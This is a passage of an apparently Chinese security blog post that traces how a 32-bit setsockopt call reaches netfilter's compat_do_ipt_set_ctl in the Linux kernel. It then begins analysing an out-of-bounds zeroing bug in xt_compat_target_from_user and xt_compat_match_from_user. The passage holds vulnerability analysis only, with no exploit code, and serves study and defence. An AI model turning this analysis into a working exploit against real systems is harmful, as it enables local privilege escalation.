class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的函数，这里因为我们开启了编译选项 <code>CONFIG_COMPAT</code>（默认开启），<strong>所以 setsockopt 系统调用最终应该会调用到</strong><code>compat_sock_common_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto_ops</span> <span class="title">inet_stream_ops</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_sock_common_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_sock_common_getsockopt,</span><br><span class="line">.compat_ioctl   = inet_compat_ioctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.set_rcvlowat   = tcp_set_rcvlowat,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>他又会调用到 <code>sk-&gt;sk_prot-&gt;compat_setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>compat_setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk-&gt;sk_prot-&gt;compat_setsockopt != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">      optval, optlen);</span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_sock_common_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>又绕回到 <code>inet_create</code>，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>compat_tcp_setsockopt()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> <span class="title">tcp_prot</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;TCP&quot;</span>,</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt= compat_tcp_setsockopt,</span><br><span class="line">.compat_getsockopt= compat_tcp_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.diag_destroy= tcp_abort,</span><br><span class="line">&#125;;</span><br><span class="line">EXPORT_SYMBOL(tcp_prot);</span><br></pre></td></tr></table></figure><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>inet_csk_compat_setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">  <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> inet_csk_compat_setsockopt(sk, level, optname,</span><br><span class="line">  optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_tcp_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在 <code>inet_csk_compat_setsockopt</code> 中会调用到 <code>icsk-&gt;icsk_af_ops-&gt;compat_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">inet_csk_compat_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">       <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (icsk-&gt;icsk_af_ops-&gt;compat_setsockopt)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;compat_setsockopt(sk, level, optname,</span><br><span class="line">    optval, optlen);</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(inet_csk_compat_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 <strong>socket 中 sock 结构体的初始化过程</strong>，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最后应该调用到 <code>compat_ip_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line">.queue_xmit   = ip_queue_xmit,</span><br><span class="line">.send_check   = tcp_v4_send_check,</span><br><span class="line">.rebuild_header   = inet_sk_rebuild_header,</span><br><span class="line">.sk_rx_dst_set   = inet_sk_rx_dst_set,</span><br><span class="line">.conn_request   = tcp_v4_conn_request,</span><br><span class="line">.syn_recv_sock   = tcp_v4_syn_recv_sock,</span><br><span class="line">.net_header_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iphdr),</span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br><span class="line">.addr2sockaddr   = inet_csk_addr2sockaddr,</span><br><span class="line">.sockaddr_len   = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_setsockopt = compat_ip_setsockopt,</span><br><span class="line">.compat_getsockopt = compat_ip_getsockopt,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.mtu_reduced   = tcp_v4_mtu_reduced,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于我们开启了 Netfilter，所以在 <code>compat_ip_setsockopt()</code> 最后会调用到 <code>compat_nf_setsockopt</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">compat_ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params"> <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = compat_nf_setsockopt(sk, PF_INET, optname, optval,</span><br><span class="line">   optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(compat_ip_setsockopt);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个函数和 <code>compat_nf_getsockopt()</code> 一样都是 <code>compat_nf_sockopt()</code> 的 wrapper，在该函数中会使用 找到对应的函数表，根据对应操作调用对应函数，我们是 32 位进程的系统调用，所以应该走入 <code>compat_set</code>这一指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">compat_nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">     <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_get)</span><br><span class="line">ret = ops-&gt;compat_get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;compat_set)</span><br><span class="line">ret = ops-&gt;compat_set(sk, val, opt, *len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么具体调用到哪个函数？在 <code>nf_sockopt_find</code> 中使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>compat_ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>compat_do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><p>前面讲到 32 位程序的 setsockopt 系统调用最终会调用到 <code>compat_do_ipt_set_ctl()</code>，而漏洞便发生在当我们指定 optname 为 <code>IPT_SO_SET_REPLACE</code> 时，其最终会调用 <code>compat_do_replace()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">compat_do_ipt_set_ctl</span><span class="params">(<span class="keyword">struct</span> sock *sk,<span class="type">int</span> cmd, <span class="type">void</span> __user *user,</span></span><br><span class="line"><span class="params">      <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(sock_net(sk)-&gt;user_ns, CAP_NET_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_REPLACE:</span><br><span class="line">ret = compat_do_replace(sock_net(sk), user, len);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IPT_SO_SET_ADD_COUNTERS:</span><br><span class="line">ret = do_add_counters(sock_net(sk), user, len, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">ret = -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">compat_do_ipt_set_ctl()</span><br><span class="line">    compat_do_replace()</span><br><span class="line">    translate_compat_table()</span><br><span class="line">    compat_copy_entry_from_user()</span><br><span class="line">    xt_compat_match_from_user()</span><br><span class="line">    xt_compat_target_from_user()</span><br></pre></td></tr></table></figure><p>这里提前说明：<strong>漏洞在</strong> <code>xt_compat_match_from_user()</code> <strong>与</strong> <code>xt_compat_target_from_user()</code> <strong>中都存在，逻辑相同</strong></p><p>我们先来看 <code>xt_compat_target_from_user()</code>，在这里会将 <code>t-&gt;data + target-&gt;targetsize</code> 起始的长度为 <code>pad</code> 的区域置 0：先将 targetsize 向上与 8 对齐，之后再减去 targetsize，剩下的这段自然就是分配的 object 减去 targetsize 后的剩余空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_target_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_target *t, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span> =</span> t-&gt;u.kernel.target;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_target</span> *<span 